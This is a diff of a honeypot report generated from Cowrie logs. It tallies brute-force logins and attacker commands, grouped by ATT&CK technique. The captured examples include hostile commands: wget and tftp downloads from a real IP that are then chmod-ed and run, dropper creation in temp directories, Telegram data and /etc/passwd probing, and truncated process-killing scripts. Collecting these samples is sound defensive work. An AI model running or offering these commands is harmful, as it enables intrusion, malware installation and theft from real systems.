@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-18 08:03:11",
+  "generated": "2026-09-18 09:03:44",
   "totals": {
-    "commands": 128,
-    "login_failed": 572,
-    "login_success": 43,
-    "sessions": 707
+    "commands": 232,
+    "login_failed": 634,
+    "login_success": 59,
+    "sessions": 777
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 572,
+      "count": 634,
       "examples": [
         "admin / user",
         "root / 123456",
@@ -21,14 +21,14 @@
         "admin / fuckfest"
       ],
       "first": "2026-09-18T00:03:59.596268Z",
-      "last": "2026-09-18T08:03:05.146248Z",
-      "unique_ips": 46
+      "last": "2026-09-18T09:03:22.992508Z",
+      "unique_ips": 53
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 43,
+      "count": 59,
       "examples": [
         "ubuntu / ubuntu",
         "adm / adm",
@@ -37,46 +37,14 @@
         "root / admin"
       ],
       "first": "2026-09-18T00:24:48.056231Z",
-      "last": "2026-09-18T07:53:51.892349Z",
-      "unique_ips": 23
-    },
-    {
-      "id": "T1222.002",
-      "name": "File and Directory Permissions Modification: Linux and Mac",
-      "tactic": "Defense Evasion",
-      "count": 19,
-      "examples": [
-        ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
-        ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
-        ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/",
-        ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/",
-        ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
-      ],
-      "first": "2026-09-18T01:58:57.968693Z",
-      "last": "2026-09-18T05:49:14.882666Z",
-      "unique_ips": 4
-    },
-    {
-      "id": "T1082",
-      "name": "System Information Discovery",
-      "tactic": "Discovery",
-      "count": 14,
-      "examples": [
-        "uname -a",
-        "cat /proc/cpuinfo",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
-        "uname -s -v -n -r -m",
-        "uname -s -m"
-      ],
-      "first": "2026-09-18T00:25:00.479830Z",
-      "last": "2026-09-18T07:07:57.342809Z",
-      "unique_ips": 10
+      "last": "2026-09-18T08:56:51.358294Z",
+      "unique_ips": 28
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 7,
+      "count": 22,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
@@ -85,34 +53,95 @@
         "https://del.sou.pp.ua/install.sh"
       ],
       "first": "2026-09-18T01:58:59.591466Z",
-      "last": "2026-09-18T05:49:14.878940Z",
-      "unique_ips": 2
+      "last": "2026-09-18T08:56:52.149349Z",
+      "unique_ips": 4
+    },
+    {
+      "id": "T1222.002",
+      "name": "File and Directory Permissions Modification: Linux and Mac",
+      "tactic": "Defense Evasion",
+      "count": 20,
+      "examples": [
+        ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
+        ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
+        ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/",
+        ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/",
+        ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
+      ],
+      "first": "2026-09-18T01:58:57.968693Z",
+      "last": "2026-09-18T08:56:52.149349Z",
+      "unique_ips": 5
+    },
+    {
+      "id": "T1082",
+      "name": "System Information Discovery",
+      "tactic": "Discovery",
+      "count": 15,
+      "examples": [
+        "uname -a",
+        "cat /proc/cpuinfo",
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "uname -s -v -n -r -m",
+        "uname -s -m"
+      ],
+      "first": "2026-09-18T00:25:00.479830Z",
+      "last": "2026-09-18T08:46:32.885575Z",
+      "unique_ips": 11
     },
     {
       "id": "T1057",
       "name": "Process Discovery",
       "tactic": "Discovery",
-      "count": 4,
+      "count": 14,
       "examples": [
         "ps | grep '[Mm]iner'",
-        "ps -ef | grep '[Mm]iner'"
+        "ps -ef | grep '[Mm]iner'",
+        "#!/bin/sh\n\nfor pid in /proc/[0-9]*; do\n    [ \"$pid\" = \"/proc/1\" ] && continue\n    [ \"$pid\" = \"/proc/2\" ] && continue\n   "
       ],
       "first": "2026-09-18T02:28:05.820841Z",
-      "last": "2026-09-18T07:07:58.305206Z",
+      "last": "2026-09-18T08:17:42.264969Z",
+      "unique_ips": 3
+    },
+    {
+      "id": "T1083",
+      "name": "File and Directory Discovery",
+      "tactic": "Discovery",
+      "count": 13,
+      "examples": [
+        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va",
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
+        "#!/bin/sh\n\nfor pid in /proc/[0-9]*; do\n    [ \"$pid\" = \"/proc/1\" ] && continue\n    [ \"$pid\" = \"/proc/2\" ] && continue\n   "
+      ],
+      "first": "2026-09-18T02:28:07.263120Z",
+      "last": "2026-09-18T08:17:42.264969Z",
+      "unique_ips": 4
+    },
+    {
+      "id": "T1489",
+      "name": "Service Stop",
+      "tactic": "Impact",
+      "count": 11,
+      "examples": [
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
+        "#!/bin/sh\n\nfor pid in /proc/[0-9]*; do\n    [ \"$pid\" = \"/proc/1\" ] && continue\n    [ \"$pid\" = \"/proc/2\" ] && continue\n   "
+      ],
+      "first": "2026-09-18T05:49:14.882666Z",
+      "last": "2026-09-18T08:17:42.264969Z",
       "unique_ips": 2
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 3,
+      "count": 4,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "id"
       ],
       "first": "2026-09-18T01:58:59.591466Z",
-      "last": "2026-09-18T04:18:53.181296Z",
-      "unique_ips": 3
+      "last": "2026-09-18T08:56:51.650171Z",
+      "unique_ips": 4
     },
     {
       "id": "T1059.004",
@@ -125,19 +154,6 @@
       ],
       "first": "2026-09-18T03:19:54.207938Z",
       "last": "2026-09-18T05:49:14.882666Z",
-      "unique_ips": 3
-    },
-    {
-      "id": "T1083",
-      "name": "File and Directory Discovery",
-      "tactic": "Discovery",
-      "count": 3,
-      "examples": [
-        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va",
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
-      ],
-      "first": "2026-09-18T02:28:07.263120Z",
-      "last": "2026-09-18T07:07:58.764733Z",
       "unique_ips": 3
     },
     {
@@ -177,6 +193,18 @@
       "unique_ips": 1
     },
     {
+      "id": "T1087.001",
+      "name": "Account Discovery: Local Account",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "cat /etc/passwd"
+      ],
+      "first": "2026-09-18T08:56:51.655376Z",
+      "last": "2026-09-18T08:56:51.655376Z",
+      "unique_ips": 1
+    },
+    {
       "id": "T1098.004",
       "name": "Account Manipulation: SSH Authorized Keys",
       "tactic": "Persistence",
@@ -186,18 +214,6 @@
       ],
       "first": "2026-09-18T05:49:10.333644Z",
       "last": "2026-09-18T05:49:10.333644Z",
-      "unique_ips": 1
-    },
-    {
-      "id": "T1489",
-      "name": "Service Stop",
-      "tactic": "Impact",
-      "count": 1,
-      "examples": [
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
-      ],
-      "first": "2026-09-18T05:49:14.882666Z",
-      "last": "2026-09-18T05:49:14.882666Z",
       "unique_ips": 1
     }
   ],
@@ -215,8 +231,32 @@
       20
     ],
     [
+      "system",
+      15
+    ],
+    [
+      "shell",
+      15
+    ],
+    [
+      "sh",
+      15
+    ],
+    [
       "/bin/busybox",
-      8
+      12
+    ],
+    [
+      "sh 0",
+      10
+    ],
+    [
+      "enable",
+      3
+    ],
+    [
+      "linuxshell",
+      2
     ],
     [
       "cd /proc && cat self/cmdline",
@@ -235,24 +275,8 @@
       2
     ],
     [
-      "enable",
-      1
-    ],
-    [
-      "system",
-      1
-    ],
-    [
-      "shell",
-      1
-    ],
-    [
-      "sh",
-      1
-    ],
-    [
-      "linuxshell",
-      1
+      "!v54!",
+      2
     ],
     [
       "enablelinuxshell",
@@ -272,14 +296,6 @@
     ],
     [
       "echo SHELL_TEST",
-      1
-    ],
-    [
-      "User-Agent: Mozilla/5.0 zgrab/0.x",
-      1
-    ],
-    [
-      "command -v python3 >/dev/null 2>&1 || (command -v apt-get >/dev/null 2>&1 && timeout 30 apt-get update -y; apt-get insta",
       1
     ]
   ]
